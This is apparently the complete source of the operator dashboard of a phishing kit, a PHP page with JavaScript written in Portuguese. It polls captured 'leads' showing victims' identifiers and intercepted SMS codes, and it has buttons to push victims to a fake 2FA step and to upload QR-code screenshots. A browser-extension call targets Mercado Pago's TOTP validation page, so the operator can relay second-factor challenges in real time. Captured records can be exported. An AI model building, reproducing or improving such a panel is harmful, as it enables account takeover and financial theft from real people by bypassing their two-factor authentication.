<?php
session_start();
// Protege a página, redirecionando para o login se o admin não estiver logado.
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: admin_login.php');
    exit;
}

// Lógica para o botão de "Sair" do menu de perfil.
if (isset($_GET['action']) && $_GET['action'] == 'logout') {
    session_unset();
    session_destroy();
    header('Location: admin_login.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel do Admin</title>
    <script src="https://unpkg.com/feather-icons"></script>
    <script src="https://cdn.jsdelivr.net/npm/jsqr/dist/jsQR.js"></script>
    <style>
        :root {
            --bg-dark: #1e1e2d;
            --bg-card: #27293d;
            --bg-sidebar: #2b2e41;
            --text-primary: #a2a3b7;
            --text-secondary: #6c7293;
            --accent-primary: #009ef7;
            --accent-success: #50cd89;
            --accent-danger: #f1416c;
            --border-color: #323248;
            --color-yellow: #ffc700;
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--bg-dark); color: var(--text-primary); font-size: 14px; }

        .admin-layout {
            display: grid;
            grid-template-columns: 260px 1fr;
            min-height: 100vh;
        }
        .sidebar {
            background-color: var(--bg-sidebar);
            padding: 24px;
            display: flex;
            flex-direction: column;
            gap: 16px;
            border-right: 1px solid var(--border-color);
        }
        .main-panel {
            display: flex;
            flex-direction: column;
            overflow-y: auto;
        }
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 32px;
            height: 70px;
            background-color: var(--bg-card);
            border-bottom: 1px solid var(--border-color);
            position: sticky; top: 0;
            z-index: 10;
        }
        .panel-content {
            padding: 24px 32px;
            flex-grow: 1;
        }
        
        .sidebar-header h2 { margin: 0 0 16px 0; font-size: 20px; display: flex; align-items: center; gap: 10px; padding-bottom: 20px; border-bottom: 1px solid var(--border-color); }
        .sidebar-menu button.btn {
            width: 100%; box-sizing: border-box; display: flex; align-items: center; gap: 12px; padding: 14px; border-radius: 6px; text-decoration: none; color: var(--text-primary); transition: background-color 0.2s, color 0.2s; font-size: 14px; background: none; border: none; cursor: pointer; text-align: left;
        }
        .sidebar-menu button.btn:hover { background-color: rgba(0, 158, 247, 0.1); color: var(--accent-primary); }
        
        .panel-header .quote { display: flex; align-items: center; gap: 10px; font-style: italic; color: var(--text-secondary); }
        .quote i { color: var(--color-yellow); }
        .profile-button { background: none; border: none; cursor: pointer; padding: 8px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--text-secondary); }
        .profile-button:hover { color: var(--text-primary); background-color: var(--bg-sidebar); }
        
        .profile-dropdown-container { position: relative; }
        .profile-dropdown {
            display: none; position: absolute; top: 55px; right: 0; background-color: var(--bg-card); border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); list-style: none; padding: 8px 0; margin: 0; width: 200px; z-index: 100; border: 1px solid var(--border-color);
        }
        .profile-dropdown.show { display: block; }
        .profile-dropdown li a { display: flex; align-items: center; gap: 12px; padding: 10px 16px; color: var(--text-primary); text-decoration: none; font-size: 14px; }
        .profile-dropdown li a:hover { background-color: var(--bg-sidebar); }
        .dropdown-separator { height: 1px; background-color: var(--border-color); margin: 8px 0; }
        
        #leads-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(550px, 1fr)); gap: 24px; }
        .card { background-color: var(--bg-card); border-radius: 8px; padding: 24px; }
        .lead-card { display: grid; grid-template-columns: 1fr 1fr; gap: 20px 30px; }
        .lead-card h3 { grid-column: 1 / -1; margin: 0 0 10px 0; font-size: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
        .lead-info { display: flex; flex-direction: column; gap: 4px; overflow-wrap: break-word; }
        .lead-info label { color: var(--text-secondary); font-size: 12px; text-transform: uppercase; }
        .lead-info span { font-weight: 500; word-break: break-all; }
        .lead-details { grid-column: 1 / 2; display: flex; flex-direction: column; gap: 20px; }
        .qr-upload-area { grid-column: 2 / 3; grid-row: 2; display: flex; flex-direction: column; }
        .qr-upload-area p { font-weight: 600; display: block; margin: 0 0 10px 0; text-align: center; }
        .paste-area { flex-grow: 1; border: 2px dashed var(--text-secondary); border-radius: 6px; padding: 20px; text-align: center; color: var(--text-secondary); cursor: pointer; transition: all 0.2s; display: flex; align-items: center; justify-content: center; min-height: 150px; }
        .paste-area:hover { border-color: var(--accent-primary); color: var(--accent-primary); }
        .actions { grid-column: 1 / -1; display: flex; flex-wrap: wrap; gap: 10px; margin-top: 20px; border-top: 1px solid var(--border-color); padding-top: 20px; }
        .actions .btn { padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; color: white; font-weight: 600; display: flex; align-items: center; gap: 8px; font-size: 12px; }
        .btn-send { background-color: var(--accent-primary); }
        .btn-request-qr { background-color: #9c27b0; }
        .btn-delete { background-color: var(--accent-danger); }
    </style>
</head>
<body>
    <div class="admin-layout">
        <aside class="sidebar">
            <div class="sidebar-header">
                <h2><i data-feather="tool"></i> Ferramentas Admin</h2>
            </div>
            <nav class="sidebar-menu">
                <button class="btn" onclick="deleteAllLeads()"><i data-feather="trash-2"></i> Apagar Tudo</button>
                <button class="btn" onclick="exportAllLeads()"><i data-feather="download"></i> Exportar Todos</button>
            </nav>
        </aside>

        <div class="main-panel">
            <header class="panel-header">
                <div class="quote">
                    <i data-feather="zap" style="width:18px; height:18px;"></i>
                    <span>"Acredite em você e todo o resto virá naturalmente."</span>
                </div>
                <div class="profile-dropdown-container">
                    <button class="profile-button" id="profile-btn">
                        <i data-feather="user"></i>
                    </button>
                    <ul class="profile-dropdown" id="profile-menu">
                        <li><a href="#"><i data-feather="user"></i> Perfil</a></li>
                        <li><a href="#"><i data-feather="lock"></i> Alterar Senha</a></li>
                        <li class="dropdown-separator"></li>
                        <li><a href="?action=logout"><i data-feather="log-out"></i> Sair</a></li>
                    </ul>
                </div>
            </header>
            <main class="panel-content">
                <div id="leads-container">
                    </div>
            </main>
        </div>
    </div>

    <template id="lead-card-template">
        <div class="card lead-card">
            <h3>
                <span>Cliente #<span class="lead-id"></span></span>
                <small style="color: var(--text-secondary);" class="lead-date"></small>
            </h3>
            <div class="lead-details">
                <div class="lead-info"><label>Identificador</label><span class="lead-identifier"></span></div>
                <div class="lead-info"><label>Código SMS</label><span class="lead-sms"></span></div>
                <div class="lead-info"><label>Status</label><span class="lead-status"></span></div>
            </div>
            <div class="qr-upload-area">
                <p>Cole aqui o print do QR Code</p>
                <div class="paste-area" contenteditable="true" onpaste="handlePaste(event, this)">Cole a imagem aqui</div>
            </div>
            <div class="actions">
                <button class="btn btn-request-qr"><i data-feather="aperture"></i> Pedir QR Code</button>
                <button class="btn btn-send" onclick="updateStatus(this, 'redirecionar_para_2fa')"><i data-feather="send"></i> Enviar para 2FA</button>
                <button class="btn btn-delete" onclick="deleteLead(this)"><i data-feather="trash"></i> Excluir</button>
            </div>
        </div>
    </template>

    <script>
        // NO SEU admin.php, DENTRO DA TAG <script>
        // Adiciona um listener de evento para os cliques nos botões de pedir QR code
        document.addEventListener('click', function(event) {
            const button = event.target.closest('.btn-request-qr');
            if (!button) return; // Se o clique não foi no botão, não faz nada

            const card = button.closest('.lead-card');
            const leadId = card.dataset.id;
            
            button.textContent = "Processando...";
            button.disabled = true;

            // Envia a mensagem para a extensão e espera uma resposta
            chrome.runtime.sendMessage({
                action: "getQrCode",
                leadId: leadId,
                targetUrl: "https://www.mercadopago.com.br/totp-in-app/validation*" // URL da página alvo
            }, (response) => {
                // Este callback será executado quando o background.js responder
                
                // Verifica se a operação foi um sucesso
                if (response && response.success) {
                    console.log("Extensão retornou sucesso!");
                    // Se desejar, pode chamar fetchData() para atualizar o painel
                } else {
                    console.error("Extensão retornou um erro:", response.error);
                    // Poderia mostrar uma mensagem de erro para o admin aqui
                }
                
                // Reseta o botão para o estado original
                button.textContent = "Pedir QR Code";
                button.disabled = false;
                feather.replace(); // Re-renderiza o ícone se necessário
            });
        });
        // LÓGICA DO MENU DROPDOWN
        const profileBtn = document.getElementById('profile-btn');
        const profileMenu = document.getElementById('profile-menu');
        profileBtn.addEventListener('click', (event) => {
            event.stopPropagation();
            profileMenu.classList.toggle('show');
        });
        window.addEventListener('click', (event) => {
            if (profileMenu.classList.contains('show') && !profileBtn.contains(event.target)) {
                profileMenu.classList.remove('show');
            }
        });

        // INICIA OS ÍCONES
        feather.replace();

        // CONSTANTES GLOBAIS
        const leadsContainer = document.getElementById('leads-container');
        const leadTemplate = document.getElementById('lead-card-template');

        // FUNÇÃO PARA COLAR E PROCESSAR O QR CODE
        function handlePaste(event, el) {
            const card = el.closest('.lead-card');
            const lead_id = card.dataset.id;
            const items = (event.clipboardData || window.clipboardData).items;

            for (const item of items) {
                if (item.type.indexOf("image") === 0) {
                    event.preventDefault();
                    const blob = item.getAsFile(); // Pega a imagem colada como um arquivo
                    
                    el.innerHTML = 'Enviando imagem...';

                    const formData = new FormData();
                    formData.append("lead_id", lead_id);
                    formData.append("qrcode_image", blob, `qr_pasted_${lead_id}.png`);

                    // Envia a IMAGEM para a api_upload_qrcode.php
                    fetch("api_upload_qrcode.php", {
                        method: "POST",
                        body: formData
                    })
                    .then(res => res.json())
                    .then(result => {
                        if(result.success) {
                            el.innerHTML = `✅ Imagem Salva!`;
                            // Atualiza o status do lead para indicar que o QR foi recebido
                            updateStatus(el, 'qr_recebido'); 
                        } else {
                            alert("Erro ao enviar imagem: " + (result.error || 'Erro desconhecido.'));
                            el.innerHTML = 'Falha. Cole novamente.';
                        }
                    })
                    .catch(() => {
                        alert("Erro fatal de conexão ao enviar imagem.");
                        el.innerHTML = 'Falha na conexão.';
                    });
                    
                    return; // Para o loop após encontrar a imagem
                }
            }
        }
        // FUNÇÃO PRINCIPAL PARA BUSCAR E EXIBIR OS DADOS
        async function fetchData() {
            try {
                const response = await fetch('api_get_capturas.php');
                if (!response.ok) throw new Error('Network response was not ok');
                const leads = await response.json();
                
                let receivedIds = new Set(leads.map(l => l.id.toString()));
                
                // Remove cards que não existem mais nos dados
                Array.from(leadsContainer.querySelectorAll('.lead-card')).forEach(card => {
                    if (!receivedIds.has(card.dataset.id)) {
                        card.remove();
                    }
                });

                if (leads.length === 0) {
                     if (!leadsContainer.querySelector('.no-leads-message')) {
                         leadsContainer.innerHTML = '<p class="card no-leads-message" style="grid-column: 1 / -1; text-align: center;">Nenhum lead recebido ainda.</p>';
                     }
                } else {
                    const noLeadsMsg = leadsContainer.querySelector('.no-leads-message');
                    if (noLeadsMsg) noLeadsMsg.remove();
                }

                leads.forEach(lead => {
                    let card = document.getElementById(`lead-${lead.id}`);
                    if (!card) {
                        const cardClone = leadTemplate.content.cloneNode(true);
                        card = cardClone.querySelector('.lead-card');
                        card.id = `lead-${lead.id}`;
                        card.dataset.id = lead.id;
                        leadsContainer.prepend(card);
                    }

                    card.querySelector('.lead-id').textContent = lead.id;
                    card.querySelector('.lead-date').textContent = new Date(lead.data_criacao).toLocaleString('pt-BR');
                    card.querySelector('.lead-identifier').textContent = lead.identificador;
                    card.querySelector('.lead-sms').textContent = lead.sms_code || 'Aguardando...';
                    
                    const statusSpan = card.querySelector('.lead-status');
                    const statusText = lead.status || 'indefinido';
                    statusSpan.textContent = statusText;

                    statusSpan.style.color = 'var(--text-primary)'; 
                    const lowerStatus = statusText.toLowerCase();
                    if (lowerStatus.includes('aprovado') || lowerStatus.includes('enviado')) {
                        statusSpan.style.color = 'var(--accent-success)';
                    } else if (lowerStatus.includes('negado')) {
                        statusSpan.style.color = 'var(--accent-danger)';
                    } else if (lowerStatus.includes('aguardando') || lowerStatus.includes('tela')) {
                        statusSpan.style.color = 'var(--accent-primary)';
                    }
                });
                
                feather.replace();
            } catch (error) {
                console.error("Erro ao buscar dados:", error);
            }
        }

        // FUNÇÃO PARA ATUALIZAR O STATUS (COMANDO DO ADMIN)
        async function updateStatus(button, newStatus) {
            const card = button.closest('.lead-card');
            const leadId = card.dataset.id;
            try {
                const response = await fetch('api_update_status.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ id: leadId, status: newStatus })
                });
                const result = await response.json();
                if (result.success) {
                    console.log(`Status do Lead #${leadId} alterado para "${newStatus}".`);
                    fetchData();
                } else {
                    alert("Erro ao atualizar status: " + (result.error || 'Erro desconhecido'));
                }
            } catch (error) {
                alert("Erro de conexão ao atualizar status.");
            }
        }
        
        // FUNÇÃO PARA EXCLUIR UM LEAD
        async function deleteLead(button) {
            const card = button.closest('.lead-card');
            const leadId = card.dataset.id;
            if (confirm(`Tem certeza que deseja excluir o Cliente #${leadId}?`)) {
                try {
                    const response = await fetch('api_delete_lead.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ id: leadId })
                    });
                    const result = await response.json();
                    if (result.success) {
                        card.style.transition = 'opacity 0.5s ease';
                        card.style.opacity = '0';
                        setTimeout(() => card.remove(), 500);
                    } else {
                        alert("Erro ao excluir lead: " + (result.error || 'Erro desconhecido'));
                    }
                } catch (error) {
                    alert("Erro de conexão ao excluir lead.");
                }
            }
        }
        
        // FUNÇÃO PARA APAGAR TODOS OS LEADS
        async function deleteAllLeads() {
            if (confirm("ATENÇÃO! Deseja apagar TODOS os registros? Esta ação é IRREVERSÍVEL.")) {
                try {
                    const response = await fetch('api_delete_all.php', { method: 'POST' });
                    const result = await response.json();
                    if (result.success) {
                        leadsContainer.innerHTML = '<p class="card no-leads-message" style="grid-column: 1 / -1; text-align: center;">Todos os leads foram apagados.</p>';
                    } else {
                        alert("Erro ao apagar todos os leads: " + (result.error || 'Erro desconhecido'));
                    }
                } catch (error) {
                    alert("Erro de conexão ao apagar todos os leads.");
                }
            }
        }

        // FUNÇÃO PARA EXPORTAR TODOS OS LEADS
        function exportAllLeads() {
            if (confirm("Deseja baixar um arquivo CSV com todos os leads?")) {
                window.location.href = 'api_export_leads.php';
            }
        }

        // INICIA A BUSCA E O INTERVALO
        fetchData();
        setInterval(fetchData, 3000);
    </script>
</body>
</html>